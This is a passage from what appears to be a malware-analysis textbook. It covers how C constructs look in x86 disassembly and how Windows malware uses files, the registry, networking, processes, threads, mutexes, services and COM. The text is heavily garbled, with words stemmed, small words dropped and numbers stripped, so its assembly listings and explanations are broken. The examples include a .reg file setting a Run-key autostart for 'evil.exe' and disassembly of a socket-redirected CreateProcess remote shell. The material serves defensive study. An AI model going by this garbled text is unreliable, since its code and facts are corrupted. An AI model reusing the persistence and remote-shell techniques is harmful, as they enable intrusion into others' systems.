nonzero x yn figur disassembl graph statement exampl exampl despit minor chang c code assembl code complic shown exampl exampl assembl code nest statement exampl shown exampl mov ebpvar mov ebpvar mov ebpvarc b mov eax ebpvar e cmp eax ebpvar jnz short loc cmp ebpvarc jnz short loc push offset aziszeroandxi z zero x yn e call printf add esp jmp short loc loc push offset azisnonzeroandx z nonzero x yn call printf add esp loc jmp short loc loc cmp ebpvarc b jnz short locc push offset azzeroandxi z zero x yn call printf add esp jmp short loc c locc c push offset aznonzeroandxi z nonzero x yn call printf see three differ condit jump occur first occur var equal var two occur varc equal zero recogn loop loop repetit task common softwar import abl recogn find loop loop basic loop mechan use c program loop alway four compon initi comparison execut instruct increment decrement exampl show exampl loop exampl c code loop int fori printfi equal dn exampl initi set zero comparison check see less less printf instruct execut increment add process check see less step repeat greater equal assembl loop recogn locat four compon initi comparison execut instruct incrementdecr exampl exampl correspond initi step code correspond increment initi jump jump instruct comparison occur decis made condit jump jump taken printf instruct execut uncondit jump occur caus increment occur exampl assembl code loop exampl exampl mov ebpvar b jmp short loc locd mov eax ebpvar add eax mov ebpvar eax loc cmp ebpvar h jge short locf c mov ecx ebpvar f push ecx push offset aid equal dn call printf add esp jmp short locd loop recogn use ida pro graph mode shown figur figur disassembl graph loop exampl exampl figur upward point arrow increment code indic loop arrow make loop easier recogn graph view standard disassembl view graph display five box top four compon loop initi comparison execut increment thatord box bottom right function epilogu describ chapter portion function respons clean stack return find loop loop frequent use malwar author loop condit met receiv packet command loop look similar loop assembl easier understand loop exampl continu loop statu return checkresult exampl c code loop int statu int result whilestatu result performact statu checkresult result assembl code exampl look similar loop except lack increment section condit jump occur uncondit jump way code stop execut repeatedli condit jump occur exampl assembl code loop exampl exampl mov ebpvar mov ebpvar loc cmp ebpvar jnz short loc call performact f mov ebpvar eax mov eax ebpvar push eax call checkresult b add esp e mov ebpvar eax jmp short loc understand function call convent chapter discuss stack call instruct use function call function call appear differ assembl code call convent govern way function call occur convent includ order paramet place stack regist whether caller function call calle respons clean stack function complet call convent use depend compil among factor often subtl differ compil implement convent difficult interfac code compil differ compil howev need follow certain convent use window api uniformli implement compat discuss chapter use pseudocod exampl describ call convent exampl pseudocod function call int testint x int int z int b c ret ret testa b c three common call convent encount cdecl stdcall fastcal discuss key differ follow section note although convent implement differ compil well focu common way use cdecl cdecl one popular convent describ chapter introduc stack function call cdecl paramet push onto stack right left caller clean stack function complet return valu store eax exampl show exampleof disassembl would look like code exampl compil use cdecl exampl cdecl function call push c push b push call test add esp mov ret eax notic highlight portion stack clean caller exampl paramet push onto stack right left begin c stdcall popular stdcall convent similar cdecl except stdcall requir calle clean stack function complet therefor add instruct highlight exampl would need stdcall convent use sinc function call would respons clean stack test function exampl would compil differ stdcall must concern clean stack epilogu would need take care cleanup stdcall standard call convent window api code call api function need clean stack sinc that respons dll implement code api function fastcal fastcal call convent vari across compil gener work similarli case fastcal first argument typic two pass regist commonli use regist edx ecx microsoft fastcal convent addit argument load right left call function usual respons clean stack necessari often effici use fastcal convent code doesnt need involv stack muchpush vs move addit use differ call convent describ far compil may also choos use differ instruct perform oper usual compil decid move rather push thing onto stack exampl show c code exampl function call function adder add two argument return result main function call adder print result use printf exampl c code function call int adder int int b return ab void main int x int printf function return number dn adderxi assembl code adder function consist across compil display exampl see code add arg arg store result eax discuss chapter eax store return valu exampl assembl code adder function exampl push ebp mov ebp esp mov eax ebp arg add eax ebp arg pop ebp retn tabl display differ call convent use two differ compil microsoft visual studio gnu compil collect gcc left paramet adder printf push onto stack call right paramet move onto stack call prepar type call convent analyst wont control compil exampl one instruct left correspond instruct right instruct restor stack pointer necessari right stack pointer never alterednot rememb even compil use differ call convent depend variou set option tabl assembl code function call two differ call convent visual studio version gcc version mov ebpvar mov ebpvar mov eax ebpvar push eax mov ecx ebpvar b push ecx c call adder add esp push eax push offset thefunctionret call dsprintf mov ebpvar c mov ebpvar mov eax ebpvar mov esp eax mov eax ebpvar mov esp eax call adder mov esp eax mov esp offset thefunctionret b call printfanalyz switch statement switch statement use programm malwar author make decis base charact integ exampl backdoor commonli select seri action use singl byte valu switch statement compil two common way use style use jump tabl style exampl show simpl switch statement use variabl depend valu code correspond case valu execut exampl c code threeoption switch statement switchi case printfi break case printfi break case printfi break default break switch statement compil assembl code shown exampl contain seri condit jump condit jump determin made comparison occur directli jump switch statement three option shown code section independ uncondit jump end list youll probabl find switch statement easier understand use graph shown figur exampl assembl code switch statement exampl exampl cmp ebpvar jz short loc cmp ebpvar jz short locd f cmp ebpvar jz short loc jmp short loc loc mov ecx ebpvar add ecx push ecx e push offset unkc call printf add esp b jmp short loc locd mov edx ebpvar add edx push edx push offset unkc call printf e add esp jmp short loc loc mov eax ebpvar add eax push eax push offset unkc f call printf add esp figur break switch option split code execut next decis made three box figur label correspond directli case statement three differ option notic box termin bottom box end function abl use graph see three check code must go var greater disassembl difficult imposs know whether origin code switch statement sequenc statement compil switch statement look like group statementsboth contain bunch cmp jcc instruct perform disassembl may alway abl get back origin sourc code may multipl way repres code construct assembl valid equival jump tabl next disassembl exampl commonli found larg contigu switch statement compil optim code avoid need make mani comparison exampl exampl valu three differ comparison would take place third case execut inexampl add one case exampl see compar list assembl code gener drastic differ exampl c code fouropt switch statement switchi case printfi break case printfi break case printfi break case printfi break default break figur disassembl graph style switch statement exampl exampl effici assembl code exampl use jump tabl shown defin offset addit memori locat switch variabl use index jump tablein exampl ecx contain switch variabl subtract first line c code switch tabl rang assembl code must adjust jump tabl properli index jump instruct target base jump tabl jump instruct edx multipli ad base jump tabl x determin case code block jump multipli entri jump tabl address byte size exampl assembl code switch statement exampl exampl sub ecx mov ebpvar ecx c cmp ebpvar ja short loc mov edx ebpvar jmp ds offedx c locc jmp short loc loc jmp short loc loc c jmp short loc e loce loc xor eax eax mov esp ebp pop ebp retn main endp dd offset locc c dd offset loc dd offset loc dd offset loce graph figur type switch statement clearer standard disassembl viewfigur disassembl graph jump tabl switch statement exampl see four case broken clearli separ assembl code chunk chunk appear one anoth column jump tabl determin one use notic box initi box termin right box end functiondisassembl array array use programm defin order set similar data item malwar sometim use array pointer string contain multipl hostnam use option connect exampl show two array use one program set iter loop array local defin array b global defin definit impact assembl code exampl c code array int b void main int int fori ai bi assembl array access use base address start point size element alway obviou determin see array index exampl show assembl code exampl exampl assembl code array exampl mov ebpvar jmp short loc f locf f mov eax ebpvar add eax mov ebpvar eax loc cmp ebpvar c jge short loc e mov ecx ebpvar mov edx ebpvar mov ebpecxvar edx mov eax ebpvar b mov ecx ebpvar e mov dwordaecx eax jmp short locf list base address array b correspond dworda base address array correspond var sinc array ofinteg element size although instruct differ access two array case ecx use index multipli account size element result valu ad base address array access proper array elementidentifi struct structur struct short similar array compris element differ type structur commonli use malwar author group inform sometim easier use structur maintain mani differ variabl independ especi mani function need access group variabl window api function often use structur must creat maintain call program exampl defin structur made integ array charact doubl main alloc memori structur pass struct test function struct gm defin global variabl exampl c code struct exampl struct mystructur int x char doubl z struct mystructur gm void test struct mystructur q int qy qz fori qxi void main gm struct mystructur malloc sizeofstruct mystructur testgm structur like array access base address use start pointer difficult determin whether nearbi data type part struct whether happen next depend structur context abil identifi structur signific impact abil analyz malwar exampl show main function exampl disassembl sinceth struct gm global variabl base address memori locat dwordea shown exampl base address structur pass sub test function via push eax exampl assembl code main function struct exampl exampl push ebp mov ebp esp push h call malloc add esp mov dwordea eax mov eax dwordea push eax call sub add esp xor eax eax pop ebp retn exampl show disassembl test method shown exampl arg base address structur offset x store charact within struct x correspond letter ascii exampl assembl code test function struct exampl exampl push ebp mov ebp esp push ecx mov eaxebparg mov byte ptr eaxh h b mov ecx ebparg e fld dsdblb fstp qword ptr ecxh mov ebpvar e jmp short loc loc mov edxebpvar add edx mov ebpvar edx loc cmp ebpvar jge short locd f mov eaxebpvar mov ecxebparg mov edxebpvar mov ecxeaxedx b jmp short loc locd mov esp ebp f pop ebp retnw tell offset x doubl use part floatingpoint instruct also tell integ move offset xc x examin loop offset access infer content structur analysi ida pro creat structur assign memori refer use hotkey chang instruct mov eaxh h mov eax mystructurey h latter easier read mark structur often help understand disassembl quickli especi constantli view structur use use hotkey effect exampl would need creat mystructur structur manual use ida pro structur window tediou process help structur encount frequentlyanalyz link list travers link list data structur consist sequenc data record record includ field contain refer link next record sequenc princip benefit use link list array order link item differ order data item store memori disk therefor link list allow insert remov node point list exampl show c code exampl link list travers link list consist seri node structur name pnode manipul two loop first loop creat node fill data second loop iter record print content exampl c code link list travers struct node int x struct node next typedef struct node pnode void main pnode curr head int head null foriii curr pnode mallocsizeofpnod currx currnext head head curr curr head whilecurr printfdn currx curr currnext best way understand disassembl identifi two code constructswithin main method cours crux chapter abil recogn construct make analysi easier exampl identifi loop first varc correspond counter loop var correspond head variabl var curr variabl var pointer struct two variabl assign valu shown loop execut iter link list within loop var set next record list exampl assembl code link list travers exampl exampl mov ebpvar mov ebpvarc loc cmp ebpvarc ah c jg short locab e mov esphvar call malloc mov ebpvar eax mov edx ebpvar mov eax ebpvarc mov edx eax mov edx ebpvar mov eax ebpvar b mov edx eax e mov eax ebpvar mov ebpvar eax lea eax ebpvarc inc dword ptr eax jmp short loc ab locab ab mov eax ebpvar ae mov ebpvar eax b b locb b cmp ebpvar b jz short locretd b mov eax ebpvar ba mov eax eax bc mov esphvar eax c mov esphvar offset ad dn c call printf cc mov eax ebpvar cf mov eax eax mov ebpvar eax jmp short locb recogn link list must first recogn object contain pointer point anoth object type recurs natur theobject make link need recogn disassembl exampl realiz var assign eax come eax came previou assign var mean whatev struct var must contain pointer byte point anoth struct must also contain pointer byte anoth struct onconclus chapter design expos constant task malwar analysi abstract detail dont get bog lowlevel detail develop abil recogn code higher level weve shown major c code construct c assembl help quickli recogn common construct analysi weve also offer coupl exampl show compil decid someth differ case struct entir differ compil use case function call develop insight help navig path toward recogn new construct encount wildlab goal lab chapter help understand overal function program analyz code construct lab guid discov analyz new code construct lab build previou one thu creat singl complic piec malwar four construct youv finish work lab abl easili recogn individu construct encount malwar lab lab analyz malwar found file labex question q major code construct found subroutin call main q subroutin locat xf q purpos program lab analyz malwar found file labex question q oper first subroutin call main perform q subroutin locat xf q second subroutin call main q type code construct use subroutin q networkbas indic program q purpos malwar lab lab well analyz malwar found file labex question q compar call main lab solut main method new function call main q paramet new function take q major code construct function contain q function q hostbas indic malwar q purpos malwar lab lab well analyz malwar found file labex question q differ call made main method lab solut lab solut q new code construct ad main q differ lab pars html function previou lab q long program run assum connect internet q new networkbas indic malwar q purpos malwarechapt analyz malici window program malwar target window platform interact close os solid understand basic window code concept allow identifi hostbas indic malwar follow malwar use os execut code without jump call instruct determin malwar purpos chapter cover varieti concept familiar window programm read even group nonmalici program gener well form compil follow microsoft guidelin malwar typic poorli form tend perform unexpect action chapter cover uniqu way malwar use window function window complex os chapter cant possibl cover everi aspect instead focu function relev malwar analysi begin brief overview common window api terminolog discuss way malwar modifi host system creat hostbas indic next cover differ way program execut code locat outsid file your analyz finish discuss malwar use kernel mode addit function stealth window api window api broad set function govern way malwar interact microsoft librari window api extens develop windowsonli applic littl need thirdparti librari window api use certain term name convent becom familiar turn specif function type hungarian notat much window api use name repres c type exampleth dword word type repres bit bit unsign integ standard c type like int short unsign int normal use window gener use hungarian notat api function identifi notat use prefix name scheme make easi identifi variabl type variabl contain bit unsign integ dword start dw exampl third argument virtualallocex function dwsize know dword hungarian notat make easier identifi variabl type pars code becom unwieldi tabl list common window api type mani type prefix follow parenthes tabl common window api type type prefix descript word w bit unsign valu dword dw doubl word bit unsign valu handl h refer object inform store handl document handl manipul window api exampl includ hmodul hinstanc hkey long pointer lp pointer anoth type exampl lpbyte pointer byte lpcstr pointer charact string string usual prefix lp actual pointer occasion see pointer p prefix anoth type instead lp bit system lp differ meaning bit system callback repres function call window api exampl internetsetstatuscallback function pass pointer function call whenev system updat internet statu handl handl item open creat os window process modul menu file handl like pointer refer object memori locat somewher els howev unlik pointershandl use arithmet oper alway repres object address thing handl store use later function call refer object createwindowex function simpl exampl handl return hwnd handl window whenev want anyth window call destroywindow youll need use handl note accord microsoft cant use hwnd pointer arithmet valu howev function return handl repres valu use pointer well point cover chapter file system function one common way malwar interact system creat modifi file distinct filenam chang exist filenam make good hostbas indic file activ hint malwar exampl malwar creat file store webbrows habit file program probabl form spywar microsoft provid sever function access file system follow createfil function use creat open file open exist file pipe stream io devic creat new file paramet dwcreationdisposit control whether createfil function creat new file open exist one readfil writefil function use read write file oper file stream first call readfil read next sever byte file next time call read next sever byte exampl open file call readfil size next time call read begin fortyfirst byte imagin though neither function make particularli easi jump around within filecreatefilemap mapviewoffil file map commonli use malwar writer allow file load memori manipul easili createfilemap function load file disk memori mapviewoffil function return pointer base address map use access file memori program call function use pointer return mapviewoffil read write anywher file featur extrem handi pars file format easili jump differ memori address note file map commonli use replic function window loader obtain map file malwar pars pe header make necessari chang file memori therebi caus pe file execut load os loader special file window number file type access much like regular file access drive letter folder like cdoc malici program often use special file special file stealthier regular one dont show directori list certain special file provid greater access system hardwar intern data special file pass string filemanipul function oper file normal file well look share file file access via namespac altern data stream share file share file special file name start servernameshar servernameshar access directori file share folder store network prefix tell os disabl string pars allow access longer filenam file access via namespac addit file access via namespac within os namespac bethought fix number folder store differ type object lowest level namespac nt namespac prefix nt namespac access devic namespac exist within nt namespac note brows nt namespac system use winobj object manag namespac viewer avail free microsoft win devic namespac prefix often use malwar access physic devic directli read write like file exampl program might use physicaldisk directli access physic disk ignor file system therebi allow modifi disk way possibl normal api use method malwar might abl read write data unalloc sector without creat access file allow avoid detect antiviru secur program exampl witti worm year back access devicephysicaldisk via nt namespac corrupt victim file system would open devicephysicaldisk write random space drive regular interv eventu corrupt victim os render unabl boot worm didnt last long victim system often fail worm could spread caus lot damag system infect anoth exampl malwar usag devicephysicalmemori order access physic memori directli allow userspac program write kernel space techniqu use malwar modifi kernel hide program user space note begin window sp devicephysicalmemori inaccess user space howev still get devicephysicalmemori kernel space use access lowlevel inform bio code configur altern data stream altern data stream ad featur allow addit data ad anexist file within ntf essenti ad one file anoth extra data show directori list shown display content file visibl access stream ad data name accord convent normalfiletxtstreamdata allow program read write stream malwar author like ad use hide datath window registri window registri use store os program configur inform set option like file system good sourc hostbas indic reveal use inform malwar function earli version window use ini file store configur inform registri creat hierarch databas inform improv perform import grown applic use store inform nearli window configur inform store registri includ network driver startup user account inform malwar often use registri persist configur data malwar add entri registri allow run automat comput boot registri larg mani way malwar use persist dig registri import registri term youll need know order understand microsoft document root key registri divid five toplevel section call root key sometim term hkey hive also use root key particular purpos explain next subkey subkey like subfold within folder key key folder registri contain addit folder valu root key subkey key valu entri valu entri order pair name valu valu data valu data data store registri entri registri root key registri split follow five root key hkeylocalmachin hklm store set global local machin hkeycurrentus hkcu store set specif current userhkeyclassesroot store inform defin type hkeycurrentconfig store set current hardwar configur specif differ current standard configur hkeyus defin set default user new user current user two commonli use root key hklm hkcu key commonli refer abbrevi key actual virtual key provid way refer underli registri inform exampl key hkeycurrentus actual store hkeyus sid sid secur identifi user current log exampl one popular subkey hkeylocalmachinesoftwaremicrosoftwindowscurrentversionrun contain seri valu execut start automat user log root key hkeylocalmachin store subkey softwar microsoft window currentvers run regedit registri editor regedit shown figur builtin window tool use view edit registri window left show open subkey window right show valu entri subkey valu entri name type valu full path subkey current view shown bottom window program run automat write entri run subkey highlight figur wellknown way set softwar run automat stealthi techniqu often use malwar launch automat autorun tool free microsoft list code run automat os start list execut run dll load internet explor program driver load kernel autorun check locat registri code design run automat wont necessarili list themfigur regedit tool common registri function malwar often use registri function part window api order modifi registri run automat system boot follow common registri function regopenkeyex open registri edit queri function allow queri edit registri key without open first program use regopenkeyex anyway regsetvalueex add new valu registri set data reggetvalu return data valu entri registri see function malwar identifi registri key access addit registri key run startup mani registri valu import system secur set mani list anywher may need resort googl search registri key see access malwareanalyz registri code practic exampl show real malwar code open run key registri ad valu program run time window start regsetvalueex function take six paramet edit registri valu entri creat new one exist note look function document regopenkeyex regsetvaluex rememb drop trail w charact exampl code modifi registri set f push samdesir push eax ulopt push offset subkey softwaremicrosoftwindowscurrentversionrun push hkeylocalmachin hkey c call esi regopenkeyexw e test eax eax jnz short locc loc lea ecx esphdata push ecx lpstring mov bl call dslstrlenw f lea edx eaxeax push edx cbdata mov edx esphhkey lea eax esph data c push eax lpdata push dwtype f push reserv lea ecx esph valuenam push ecx lpvaluenam push edx hkey aa call dsregsetvalueexw exampl contain comment end line semicolon case comment name paramet push stack come microsoft document function call exampl first four line comment samdesir ulopt softwaremicrosoftwindowscurrentversionrun hkey comment give inform mean valu push samdesir valu indic type secur access request ulopt field unsign long integ repres option call rememberabout hungarian notat hkey handl root key access code call regopenkeyex function paramet need open handl registri key hklmsoftwaremicrosoftwindowscurrentversionrun valu name data store stack paramet function shown label ida pro call lstrlenw need order get size data given paramet regsetvalueex function registri script reg file file reg extens contain humanread registri data user doubleclick reg file automat modifi registri merg inform file contain registryalmost like script modifi registri might imagin malwar sometim use reg file modifi registri although often directli edit registri programmat exampl show exampl reg file exampl sampl reg file window registri editor version hklmsoftwaremicrosoftwindowscurrentversionrun maliciousvaluecwindowsevilex first line exampl simpli list version registri editor case version correspond window xp key modifi hklmsoftwaremicrosoftwindowscurrentversionrun appear within bracket last line reg file contain valu name data key list add valu name maliciousvalu automat run cwindowsevilex time os bootsnetwork api malwar commonli reli network function dirti work mani window api function network commun task creat network signatur complic exclus focu chapter goal show recogn understand common network function identifi malici program function use berkeley compat socket window network option malwar commonli use berkeley compat socket function almost ident window unix system berkeley compat socket network function window implement winsock librari primarili wsdll socket connect bind listen accept send recv function common describ tabl tabl berkeley compat socket network function function descript socket creat socket bind attach socket particular port prior accept call listen indic socket listen incom connect accept open connect remot socket accept connect connect open connect remot socket remot socket must wait connect recv receiv data remot socket send send data remot socket noteth wsastartup function must call network function order alloc resourc network librari look start network connect debug code use set breakpoint wsastartup start network follow shortli server client side network alway two side network program server side maintain open socket wait incom connect client side connect wait socket malwar either one case clientsid applic connect remot socket see socket call follow connect call follow send recv necessari servic applic listen incom connect socket bind listen accept function call order follow send recv necessari pattern common malici nonmalici program exampl show exampl server socket program note exampl leav error handl paramet setup realist exampl would litter call wsagetlasterror errorhandl function exampl simplifi program server socket push ecx lpwsadata push h wversionrequest mov word ptr esphnamesadata ax c call ds wsastartup push protocol push type push af call ds socket e push h namelen lea edx espchnam mov ebx eax push edx name push ebx call ds bind e mov esi ds listen push backlog push ebx call esi listen lea eax esphaddrlen push eax addrlen e lea ecx espchhostshort push ecx addr push ebx call ds accept first wsastartup initi win socket system socket creat socket bind function attach socket port listen call set socket listen accept call hang wait connect remot socket wininet api addit winsock api higherlevel api call wininet api wininet api function store wininetdl program import function dll use higherlevel network api wininet api implement protocol http ftp applic layer gain understand malwar base connect open internetopen use initi connect internet internetopenurl use connect url http page ftp resourc internetreadfil work much like readfil function allow program read data file download internet malwar use wininet api connect remot server get instruct executionfollow run malwar mani way malwar transfer execut addit jump call instruct visibl ida pro import malwar analyst abl figur malwar could induc code run first common way access code outsid singl file use dll dll dynam link librari dll current window way use librari share code among multipl applic dll execut file run alon export function use applic static librari standard prior use dll static librari still exist much less common main advantag use dll static librari memori use dll share among run process exampl librari use two differ run process code static librari would take twice much memori would load memori twice anoth major advantag use dll distribut execut use dll known host window system without need redistribut help softwar develop malwar writer minim size softwar distribut dll also use codereus mechan exampl larg softwar compani creat dll function common mani applic distribut applic distribut main exe dll applic use allow maintain singl librari common code distribut need malwar author use dll malwar writer use dll three way store malici code sometim malwar author find advantag store malici code dll rather exe file malwar attach processesbut process contain one exe file malwar sometim use dll load anoth process use window dll nearli malwar use basic window dll found everi system window dll contain function need interact os way malici program use window dll often offer tremend insight malwar analyst import learn chapter function cover throughout chapter import window dll throughout balanc chapter continu cover function specif dll describ malwar use use thirdparti dll malwar also use thirdparti dll interact program see malwar import function thirdparti dll infer interact program accomplish goal exampl might use mozilla firefox dll connect back server rather connect directli window api malwar might also distribut custom dll use function librari alreadi instal victim machin exampl use encrypt function distribut dll basic dll structur hood dll file look almost exactli like exe file dll use pe file format singl flag indic file dll exe dll often export gener fewer import there real differ dll exe main dll function dllmain label export dll specifi pe header file entri point function call notifi dll whenev process load unload librari creat new thread finish exist thread notif allow dll manag perprocess perthread resourc dll perthread resourc ignor call dllmain caus thread activ howev dll resourc must manag per thread resourc provid hint analyst thedll purpos process malwar also execut code outsid current program creat new process modifi exist one process program execut window process manag resourc open handl memori process contain one thread execut cpu tradit malwar consist independ process newer malwar commonli execut code part anoth process window use process contain manag resourc keep separ program interf usual least process run window system one time share resourc includ cpu file system memori hardwar would difficult write program program need manag share resourc other os allow process access resourc without interf process also contribut stabil prevent error crash one program affect program one resourc that particularli import os share among process system memori accomplish process given memori space separ process sum memori address process use process requir memori os alloc memori give process address use access memori process share memori address often exampl one process store someth memori address x anoth store someth address process conflict address physic memori store data like mail address memori address meaning context address main street tell locat unless also zip code address xa tell data store unless know process malici program access memori address xa affect store address process contain malici code program system use addresswil unaffect creat new process function commonli use malwar creat new process createprocess function mani paramet caller lot control creat exampl malwar could call function creat process execut malici code order bypass hostbas firewal secur mechan could creat instanc internet explor use program access malici content malwar commonli use createprocess creat simpl remot shell singl function call one paramet createprocess function startupinfo struct includ handl standard input standard output standard error stream process malici program could set valu socket program write standard output realli write socket therebi allow attack execut shell remot without run anyth call createprocess exampl show createprocess could use creat simpl remot shell prior snippet code would open socket remot locat handl socket store stack enter startupinfo structur createprocess call input output process rout socket exampl sampl code use createprocess call da mov eax dword ptr esphsockethandl de lea edx esphstartupinfo e push ecx lpprocessinform e push edx lpstartupinfo e mov esphstartupinfohstderror eax e mov esphstartupinfohstdoutput eax ec mov esphstartupinfohstdinput eax f mov eax dword f push lpcurrentdirectori f push lpenviron f push dwcreationflag fb mov dword ptr espchcommandlin eax ff push binherithandl push lpthreadattribut lea eax esphcommandlin push lpprocessattribut push eax lpcommandlin push lpapplicationnam c mov esphstartupinfodwflag h call dscreateprocessain first line code stack variabl sockethandl place eax socket handl initi outsid function lpstartupinfo structur process store standard output standard input standard error use new process socket place lpstartupinfo structur three valu access dword contain command line program execut eventu push stack paramet call createprocess paramet except lpcommandlin lpprocessinform lpstartupinfo either repres null valu other repres flag none interest malwar analysi call createprocess creat new process input output redirect socket find remot host would need determin socket initi includ exampl discov program run would need find string store dword navig address ida pro malwar often creat new process store one program insid anoth resourc section chapter discuss resourc section pe file store file malwar sometim store anoth execut resourc section program run extract addit execut pe header write disk call createprocess run program also done dll execut code happen must open program resourc hacker util discuss chapter save embed execut file disk order analyz thread process contain execut thread window os execut thread independ sequenc instruct execut cpu without wait thread process contain one thread execut part code within process thread within process share memori space processor regist stack thread contextwhen one thread run complet control cpu cpu core thread affect state cpu core thread chang valu regist cpu affect thread os switch thread valu cpu save structur call thread context os load thread context new thread cpu execut new thread exampl show exampl access local variabl push stack exampl access local variabl push stack de lea edx esph e push edx exampl code access local variabl esph store edx push edx onto stack anoth thread run code two instruct code modifi edx valu edx would wrong code would execut properli threadcontext switch use anoth thread run two instruct valu edx store thread context thread start execut push instruct thread context restor edx store proper valu way thread interfer regist flag anoth thread creat thread createthread function use creat new thread function caller specifi start address often call start function execut begin start address continu function return although function need return thread run process end analyz code call createthread need analyz start function addit analyz rest code function call createthread caller createthread specifi function thread start singl paramet pass start function paramet valu depend function thread start malwar use createthread multipl way followingmalwar use createthread load new malici librari process createthread call address loadlibrari specifi start address argument pass createthread name librari load new dll load memori process dllmain call malwar creat two new thread input output one listen socket pipe output standard input process read standard output send socket pipe malwar goal send inform singl socket pipe order commun seamlessli run applic exampl show recogn second techniqu identifi two createthread call near system call threadfunct threadfunct shown code call createthread twice argument lpstartaddress valu tell us look code run thread start exampl main function thread exampl ee lea eax ebpthreadid f push eax lpthreadid f push dwcreationflag f push lpparamet f push offset threadfunct lpstartaddress fe push dwstacksiz lea ecx ebpthreadattribut push ecx lpthreadattribut call dscreatethread mov ebpvarc eax lea edx ebpthreadid push edx lpthreadid push dwcreationflag c push lpparamet e push offset threadfunct lpstartaddress push dwstacksiz lea eax ebpthreadattribut b push eax lpthreadattribut c call dscreatethread exampl label start function threadfunct first call createthread threadfunct second call determin purpos two thread first navig threadfunct shown exampl first thread function execut loop call readfil read pipe forward dataout socket send function exampl threadfunct thread exampl c call dsreadfil call dssend shown exampl second thread function execut loop call recv read data sent network forward data pipe writefil function read applic exampl threadfunct thread exampl f call dsrecv call dswritefil note addit thread microsoft system use fiber fiber like thread manag thread rather os fiber share singl thread context interprocess coordin mutex one topic relat thread process mutex refer mutant kernel mutex global object coordin multipl process thread mutex mainli use control access share resourc often use malwar exampl two thread must access memori structur one safe access time mutex use control access one thread mutex time mutex import malwar analysi often use hardcod name make good hostbas indic hardcod name common mutex name must consist use two process arent commun way thread gain access mutex call waitforsingleobject subsequ thread attempt gain access must wait thread finish use mutex use releasemutex functiona mutex creat createmutex function one process get handl anoth processs mutex use openmutex call malwar commonli creat mutex attempt open exist mutex name ensur one version malwar run time demonstr exampl exampl use mutex ensur one copi malwar run system push offset name hgl push binherithandl push fh dwdesiredaccess c call dsimpopenmutexw openmutexwxxx test eax eax jz short loce push int call dsimpexit e push offset name hgl push binitialown push lpmutexattribut call dsimpcreatemutexw createmutexwxxx code exampl use hardcod name hgl mutex first check see mutex name hgl use openmutex call return valu null jump exit call continu execut return valu null call exit process exit code continu execut mutex creat ensur addit instanc program exit reach code servic anoth way malwar execut addit code instal servic window allow task run without process thread use servic run background applic code schedul run window servic manag without user input given time window os sever servic run use servic mani advantag malwar writer one servic normal run system anoth privileg account vulner need administr access order instal servic conveni malwar writer system account access administr user accountsservic also provid anoth way maintain persist system set run automat os start may even show task manag process user search run applic wouldnt find anyth suspici malwar isnt run separ process note possibl list run servic use net start command line display name run servic program autorun tool mention earlier use gather inform run servic servic instal manipul via window api function prime target malwar sever key function look openscmanag return handl servic control manag use subsequ servicerel function call code interact servic call function createservic add new servic servic control manag allow caller specifi whether servic start automat boot time must start manual startservic start servic use servic set start manual window os support sever differ servic type execut uniqu way one commonli use malwar winshareprocess type store code servic dll combin sever differ servic singl share process task manag find sever instanc process call svchostex run winshareprocess type servic winownprocess type also use store code exe file run independ process final common servic type kerneldriv use load code kernel discuss malwar run kernel later chapter extens chapter inform servic local system store registri eachservic subkey hklmsystemcurrentcontrolsetservic exampl figur show registri entri hklmsystemcurrentcontrolsetservicesvmwar nat servic figur registri entri vmware nat servic code vmware nat servic store cwindowssystemvmnatex type valu x correspond winownprocess start valu x correspond autostart sc program commandlin tool includ window use investig manipul servic includ command ad delet start stop queri servic exampl qc command queri servic configur option access inform registri entri shown figur readabl way exampl show sc program action exampl queri configur inform command sc program cusersusersc qc vmware nat servic sc queryserviceconfig success servicenam vmware nat servic type winownprocess starttyp autostart errorcontrol normal binarypathnam cwindowssystemvmnatex loadordergroup tag displaynam vmware nat servic depend vmnetuserif servicestartnam localsystem exampl show queri configur inform command thisinform ident store registri vmware nat servic easier read numer valu meaning label winownprocess sc program mani differ command run sc without paramet result list possibl command malwar run servic see chapter compon object model microsoft compon object model com interfac standard make possibl differ softwar compon call other code without knowledg specif analyz malwar use com youll need abl determin code run result com function call com work program languag design support reusabl softwar compon could util program com use object construct work well objectori program languag com work exclus objectori program languag sinc versatil com pervas within underli os within microsoft applic occasion com also use thirdparti applic malwar use com function difficult analyz use analysi techniqu present section com implement clientserv framework client program make use com object server reusabl softwar componentsth com object microsoft provid larg number com object program use thread use com must call oleiniti coinitializeex function least prior call com librari function malwar analyst search call determin whether program use com function howev know piec malwar use com object client provid much inform com object divers widespread determin program use com youll need find coupl identifi object use continu analysi clsid iid use com objectscom object access via global uniqu identifi guid known class identifi clsid interfac identifi iid cocreateinst function use get access com function one common function use malwar navig allow program launch internet explor access web address navig function part iwebbrows interfac specifi list function must implement specifi program provid function program provid function com class implement iwebbrows interfac case iwebbrows interfac implement internet explor interfac identifi guid call iid class identifi guid call clsid consid exampl piec malwar use navig function iwebbrows interfac implement internet explor malwar first call cocreateinst function function accept clsid iid object malwar request os search class inform load program perform function isnt alreadi run cocreateinst class return pointer point structur contain function pointer use function com server malwar call function whose pointer store structur return cocreateinst exampl show code get access iwebbrows object exampl access com object cocreateinst lea eax esphpointertocomobject push eax ppv push offset iidiwebbrows riid e push dwclscontext push punkout push offset struc rclsid call cocreateinst order understand code click structur store iid clsid code specifi iid dccdafda cfcee repres iwebbrows interfac clsid dfc repres internet explor ida pro recogn label iid iwebbrows sinc commonli use softwar develop creat iid ida pro cant alway labelth iid use program never abl label clsid disassembl doesnt contain necessari inform program call cocreateinst os use inform registri determin file contain request com code hklmsoftwareclassesclsid hkcusoftwareclassesclsid registri key store inform code execut com server valu cprogram filesinternet exploreriexploreex store localserv subkey registri key hklmsoftwareclassesclsiddfc identifi execut load cocreateinst call structur return cocreateinst call com client call function whose locat store offset structur exampl show call refer com object store stack move eax first valu structur point tabl function pointer offset xc tabl navig function call exampl call com function e push ecx f push ecx push ecx mov esi eax mov eax esphpointertocomobject mov edx eax mov edx edx ch c push ecx push esi e push eax f call edx order identifi malici program call com function malwar analyst must determin offset function store tricki ida pro store offset structur common interfac explor via structur subview press insert key add structur click add standard structur name structur add interfacenam vtbl navig exampl add iwebbrowservtbl structur structur ad rightclick offset disassembl chang label ch function name iwebbrowservtblnavig ida pro add comment call instruct paramet push onto stackfor function avail ida pro one strategi identifi function call com client check header file interfac specifi call cocreateinst header file includ microsoft visual studio platform sdk also found internet function usual declar order header file function tabl exampl navig function twelfth function h file correspond offset xc first function function take byte previou exampl internet explor load process cocreateinst call alway case com object implement dll load process space com client execut com object set load dll registri entri clsid includ subkey inprocserv rather localserv com server malwar malwar implement malici com server subsequ use applic common com 